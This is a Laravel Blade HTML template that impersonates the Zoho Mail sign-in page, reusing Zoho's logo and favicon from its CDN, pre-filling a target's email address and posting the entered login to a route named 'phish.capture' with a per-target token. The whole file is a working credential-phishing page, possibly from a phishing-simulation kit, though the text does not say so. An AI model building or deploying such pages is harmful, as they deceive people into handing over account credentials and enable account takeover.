<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in to Zoho Mail</title>
    <link rel="icon" href="https://static.zohocdn.com/iam/v2/assets/images/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:ZohoPuvi,Georgia,'Times New Roman',serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;padding:32px;width:100%;max-width:398px;border:1px solid #ececec;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.04)}
        .logo{height:40px;margin-bottom:24px;background:url("https://static.zohocdn.com/iam/v2/components/images/newZoho_logo.5f6895fcb293501287eccaf0007b39a5.svg") no-repeat center/contain;width:160px}
        .step-label{font-size:12px;color:#727272;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.5px}
        h1{font-size:18px;color:#333;font-weight:600;margin-bottom:6px}
        .org-name{font-size:14px;color:#666;margin-bottom:24px}
        .input-group{margin-bottom:16px}
        .input-group input{width:100%;height:44px;padding:1px 12px 1px 2px;font-size:16px;font-family:ZohoPuvi,Georgia,serif;color:#000;background:#f8f8f8;border:1px solid #e4e4e4;border-radius:2px;outline:none;transition:border-color .15s}
        .input-group input:focus{border-color:#159aff;box-shadow:0 0 0 1px #159aff}
        .input-group input::placeholder{color:#999}
        .btn-signin{width:100%;height:44px;background:#159aff;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;font-family:ZohoPuvi,Georgia,serif;letter-spacing:0.5px;cursor:pointer;box-shadow:0 2px 2px 0 rgba(255,255,255,.2);transition:background .15s}
        .btn-signin:hover{background:#0b84e6}
        .links{display:flex;justify-content:space-between;margin-top:16px}
        .links a{font-size:13px;color:#1389e3;text-decoration:none}
        .links a:hover{text-decoration:underline}
        .footer{margin-top:24px;text-align:center;font-size:12px;color:#727272}
        .org-card{display:flex;align-items:center;gap:10px;padding:12px;border:1px solid #e4e4e4;border-radius:4px;margin-bottom:16px;cursor:pointer;transition:border-color .15s}
        .org-card:hover{border-color:#159aff}
        .org-avatar{width:32px;height:32px;border-radius:50%;background:#159aff;display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:600}
        .org-info{font-size:14px;color:#333;font-weight:500}
        .org-sub{font-size:12px;color:#727272}
        @media(max-width:480px){.card{padding:24px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo"></div>
        <div class="step-label">Step 1 of 2</div>
        <h1>Sign in to access Accounts</h1>
        <p class="org-name">Zoho Accounts</p>

        <div class="org-card">
            <div class="org-avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div>
                <div class="org-info">{{ $email }}</div>
                <div class="org-sub">Personal</div>
            </div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'zoho', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="input-group">
                <input type="text" name="email" placeholder="Email address or mobile number" value="{{ $email }}" autocomplete="username">
            </div>

            <button type="submit" class="btn-signin">Sign in</button>
        </form>

        <div class="links">
            <a href="#">Sign in using OTP</a>
            <a href="#">Forgot Password?</a>
        </div>

        <div class="footer">
            <a href="#" style="color:#1389e3;text-decoration:none">Sign in to another account</a>
        </div>
    </div>
</body>
</html>
